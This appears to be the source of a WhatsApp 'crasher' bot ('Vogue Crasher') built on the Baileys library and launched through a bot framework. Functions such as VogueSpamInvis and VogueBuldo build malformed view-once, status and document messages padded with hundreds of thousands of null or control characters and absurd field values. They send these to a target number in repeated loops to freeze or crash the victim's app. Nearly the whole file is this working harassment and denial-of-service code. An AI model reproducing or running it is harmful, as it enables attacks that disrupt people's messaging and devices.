mn9Jnz/KIrbL/hWH9s/Ab9B7jpPsn4V9it7K37W0+xn4GwX9pRvrSrbXUN+jVW7KOumqMd2Vfe6n2M/A1DOVzWtMsYjcW1SVOtTpOUZx5pitnik2x6PJRspSkspN/QhLI+X1ysV35eZLwzK+EYZeRurK29HXimlLeb5mMwzbjrXHFLj/0suzzMGK4hmm3t7y+rVqMoTbhJ8HpEUK1NySUTlb6jZ1KsYwpYbfgizbTcXq2djTsaMJJXOu/U04aLo/MzvDH9oWnaw8Ua7ne2pXOWr300FJ04b8H1NdJj2GP7QtO1h4o5XKaqJsy6xGSu4uTynjHqN+MhzG/aW/7T5I14x/Mj9pr/ALT5I7Xn7Uehrvoo+37HlJ8ByI9F8ByZ558wim68SPcrVMaeSW8i2YE+407Yvd0ZYNd2m+vT06zm468d1pcTQqtKnWio1acJpPXSSTPzXbVrmwuY3FlWqUK0eU4PRnXedMzLgsTqdyPka6dwox2tH0tjrlOhQjSqxfLwN9pUqdGLjSpwgm9dIpI+q0aVZJVacJpct6KZgazpmb8Sn3Y+QSznmX8Sn3I+RflUPA2/qK26bX8vyb1Sp06Ud2lCMI89IrRGcbY7qlK3sLSMk6ym6jj1LTQqMM4ZjktJYlU7sfI5tWde7ryr3VWdWrLnOb1bOdW4Uo7UjHf61TuKDpUotZ8Sw7Ko6Ztpv+DPwNluaFK6oTo3EI1KU1pKMlqmjAsPurnDbpXFjVdKsk0pJdDOk825g6MQn3Y+RNGvGEdrRGm6pStaHCqRb5+o1dZZwVf6ba/pofZ4JhtlXVa0sqFKquCnCGjRkSzbmH8Qn3Y+Qcc14/038+7HyOnlNPwNq1qzTyqb/wAX5NNzvdUrfLV4qkknUjuRXW2ZDhkPtC07WHih17fX2J1Izv7ipWa5bz4L8kBTi4SjODalFpp9TM9WrxJZPJv79XdZVEsJG8mP5lXtNf8AafINZnxr/ez7q8iBOpUuLidavJzqzespPpZVevGokka9S1KneQUYJrD7x9IdqR4cBupmPIRTIsITFjIs6HnJh6J8z3cR4mGmIvJ8qa6g1SR4mMi9RFJpnsYJDYpIBBpgWg1FNHygj5MNMBnygg4wXUeIJMQxkYoNICLDTApBKKGR4C0wkwDoOiw0+AmLGJiLTKWmHFiU9GGmdTzsjosNMTFhpiKTHJhJikw0xFDosNMQmMiwOkZDkw4sSmGmItDkwkxUWGmAxiYyLEphJgA9MJMVGQaYihiYaYpMJMAKcnqep6MCIZ0MbWQ0w0xK5hoCUxyYaYmIaYikxyYSYpcxgih0WEmJXMYmI6RY1MOLEoNAWOTCTFRfHQNAMYmMjIUEgAcmFqKiw0xFH//Z",
                thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
                thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
                thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
                mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
                mediaKeyTimestamp: "1743101489",
                thumbnailHeight: 641,
                thumbnailWidth: 640,
                inviteLinkGroupTypeV2: "DEFAULT"
            }
        }
        let msg2 = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    extendMsg
                }
            }
        }, {});
        let msg3 = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    locationMessage
                }
            }
        }, {});
        
        for (let i = 0; i < 10; i++) {
            await sock.relayMessage('status@broadcast', msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [{
                    tag: 'meta',
                    attrs: {},
                    content: [{
                        tag: 'mentioned_users',
                        attrs: {},
                        content: [{
                            tag: 'to',
                            attrs: {
                                jid: target
                            },
                            content: undefined
                        }]
                    }]
                }]
            });
            
            await sock.relayMessage('status@broadcast', msg2.message, {
                messageId: msg2.key.id,
                statusJidList: [target],
                additionalNodes: [{
                    tag: 'meta',
                    attrs: {},
                    content: [{
                        tag: 'mentioned_users',
                        attrs: {},
                        content: [{
                            tag: 'to',
                            attrs: {
                                jid: target
                            },
                            content: undefined
                        }]
                    }]
                }]
            });
            await sock.relayMessage('status@broadcast', msg.message, {
                messageId: msgx.key.id,
                statusJidList: [target],
                additionalNodes: [{
                    tag: 'meta',
                    attrs: {},
                    content: [{
                        tag: 'mentioned_users',
                        attrs: {},
                        content: [{
                            tag: 'to',
                            attrs: {
                                jid: target
                            },
                            content: undefined
                        }]
                    }]
                }]
            });
            await sock.relayMessage('status@broadcast', msg2.message, {
                messageId: msgx2.key.id,
                statusJidList: [target],
                additionalNodes: [{
                    tag: 'meta',
                    attrs: {},
                    content: [{
                        tag: 'mentioned_users',
                        attrs: {},
                        content: [{
                            tag: 'to',
                            attrs: {
                                jid: target
                            },
                            content: undefined
                        }]
                    }]
                }]
            });
            
            await sock.relayMessage('status@broadcast', msg3.message, {
                messageId: msg2.key.id,
                statusJidList: [target],
                additionalNodes: [{
                    tag: 'meta',
                    attrs: {},
                    content: [{
                        tag: 'mentioned_users',
                        attrs: {},
                        content: [{
                            tag: 'to',
                            attrs: {
                                jid: target
                            },
                            content: undefined
                        }]
                    }]
                }]
            });
            if (i < 9) {
                await new Promise(resolve => setTimeout(resolve, 5000));
            }
        }
    } catch (err) {
        console.error(err);
    }
};

async function VogueSpamInvis(sock, target) {
  try {
    const type = ["galaxy_message", "call_permission_request", "address_message", "payment_method", "mpm"];    
    for (const x of type) {
      const enty = Math.floor(Math.random() * type.length);
      const msg = generateWAMessageFromContent(
        target,
        {
          viewOnceMessage: {
            message: {
              interactiveResponseMessage: {
                body: {
                  text: "\u0003",
                  format: "DEFAULT"
                },
                nativeFlowResponseMessage: {
                  name: x,
                  paramsJson: "\x10".repeat(1000000),
                  version: 3
                },
                entryPointConversionSource: type[enty]
              }
            }
          }
        },
        {
          participant: { jid: target }
        }
      );
      
      await sock.relayMessage(
        target,
        {
          groupStatusMessageV2: {
            message: msg.message
          }
        },
        {
          messageId: msg.key.id,
          participant: { jid: target }
        }
      );
      
      await new Promise(resolve => setTimeout(resolve, 1000));
    }
  } catch (err) {
    await console.error(`${err.message}`);
  }
}

async function VogueBuldo(sock, target) {
    const totalAttack = 10;
    for (let i = 0; i < totalAttack; i++) {
        const MsgNew = {
    groupStatusMessageV2: {
      message: {
        documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/701194605_979944131092122_1860918218284985201_n.enc?ccb=11-4&oh=01_Q5Aa4gE59mooNBmYLPOKcNT25wDzfB1ctLP8qfS5BxyUygCgbQ&oe=6A2E2184&_nc_sid=5e03e0&mms3=true",
          directPath: "/v/t62.7119-24/701194605_979944131092122_1860918218284985201_n.enc?ccb=11-4&oh=01_Q5Aa4gE59mooNBmYLPOKcNT25wDzfB1ctLP8qfS5BxyUygCgbQ&oe=6A2E2184&_nc_sid=5e03e0",
          mediaKey: Buffer.from("89lwViNcegystiWyPMjQd8MyzphI1OrGEKMqjbOJJGQ=", "base64"),
          fileEncSha256: Buffer.from("QH0ZymePSShq4wyl3u8FqVOQiXKAUaubDdhDSbQpy8Q=", "base64"),
          fileSha256: Buffer.from("5bhEzFf1cJTqRYXiNfNseMHNIiJiu4nVPJTctNaz5V0=", "base64"),
          mimetype: "application/msword",
          fileLength: "10485760",
          mediaKeyTimestamp: "1778818915",
          fileName: "꦳".repeat(12000),
          title: "\u0000".repeat(900000),
          pageCount: 999999999,
          contactVcard: false,
          thumbnailDirectPath: "/v/t62.7119-24/701194605_979944131092122_1860918218284985201_n.enc?ccb=11-4&oh=01_Q5Aa4gE59mooNBmYLPOKcNT25wDzfB1ctLP8qfS5BxyUygCgbQ&oe=6A2E2184&_nc_sid=5e03e0",
          thumbnailSha256: Buffer.from("5bhEzFf1cJTqRYXiNfNseMHNIiJiu4nVPJTctNaz5V0=", "base64"),
          thumbnailEncSha256: Buffer.from("QH0ZymePSShq4wyl3u8FqVOQiXKAUaubDdhDSbQpy8Q=", "base64"),
          thumbnailHeight: 100,
          thumbnailWidth: 100,
          caption: "",
          accessibilityLabel: "",
          mediaKeyDomain: 1,
          contextInfo: {
            urlTrackingMap: {
              urlTrackingMapElements: Array.from({ length: 1 }, () => ({}))
            },
            participants: Array.from({ length: 1 }, (_, n) => ({
              participant: `62${n + 829599}@s.whatsapp.net`
            }))
          }
        }
      }
    }
  };

  try {
    await sock.relayMessage(target, MsgNew, { participant: { jid: target } });
    console.log(`message success to ${target}`);
  } catch (e) {
    console.log("[!] Error Strike:", e);
    await restartBot("Connection Closed");
  }
  await sleep(1500)
}
}


//     _       ___  _   _ _   _ _____  _   _        
//    | |     / _ \| | | | \ | /  __ \| | | |       
//    | |    / /_\ \ | | |  \| | /  \/| |_| |       
//    | |    |  _  | | | | . ` | |    |  _  |       
//    | |____| | | | |_| | |\  | \__/\| | | |       
//    \_____/\_| |_/\___/\_| \_/\____/\_| |_/       
//                                                  
//                                                  
//     _   _  _____ _____ _   _ _____               
//    | | | ||  _  |  __ \ | | |  ___|              
//    | | | || | | | |  \/ | | | |__                
//    | | | || | | | | __| | | |  __|               
//    \ \_/ /\ \_/ / |_\ \ |_| | |___               
//     \___/  \___/ \____/\___/\____/               
//                                                  
//                                                  
//     _____ ______  ___   _____ _   _  ___________ 
//    /  __ \| ___ \/ _ \ /  ___| | | ||  ___| ___ \
//    | /  \/| |_/ / /_\ \\ `--.| |_| || |__ | |_/ /
//    | |    |    /|  _  | `--. \  _  ||  __||    / 
//    | \__/\| |\ \| | | |/\__/ / | | || |___| |\ \ 
//     \____/\_| \_\_| |_/\____/\_| |_/\____/\_| \_|
//                                                  
//

bot.launch()